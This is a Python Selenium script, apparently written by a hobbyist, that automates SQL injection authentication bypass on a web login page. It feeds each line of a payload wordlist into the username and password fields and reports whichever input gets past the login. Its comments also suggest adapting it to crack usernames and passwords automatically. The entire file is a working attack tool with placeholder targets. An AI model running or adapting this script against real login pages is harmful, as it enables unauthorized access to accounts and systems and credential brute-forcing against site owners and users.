#Bot for testing a login platform for SQL injection (Authentication Bypass)
#with some modification it can be used for cracking usernames and passwords automatically
#when using another browser than Firefox, just change the function and install the right browser engine
#words in capital letters have to be adjusted to your webpage
#it's by far not perfect and there exists programs which do the same task more efficient and faster but it was nice to program a bot for logging in myself

from selenium import webdriver

filePayLoads = open('PATH_TO_WORDLIST/PAYLOAD', 'r')
Lines = filePayLoads.readlines() #stores the content of above file

driver = webdriver.Firefox(executable_path="PATH_TO_GECKODRIVER") #geckodriver is browser engine for firefox
login_url = 'URL_OF_LOGINPAGE'
driver.get(login_url) #opens website in new browser window

for line in Lines:   
    button =  driver.find_elements_by_xpath("//input[@name='NAME' and @value='VALUE']")[0] #submit button, change values of @name and @value
    username = driver.find_elements_by_xpath("//input[@id='USER']")[0] #username textarea, change values of @id
    password = driver.find_elements_by_xpath("//input[@id='PASSWORD']")[0] #password textarea, change values of @id
    
    #clears any possible former input
    username.clear()
    password.clear()
    
    username.send_keys(line) #sends the current line of file as username
    password.send_keys(line) #sends the current line of file as password

    button.click()

    current_url = driver.current_url #gets url of current webpage
    if current_url != login_url: #when you succesfully loged in
        print()
        print ("The login worked with: ", line) #prints out the succesful input
        break
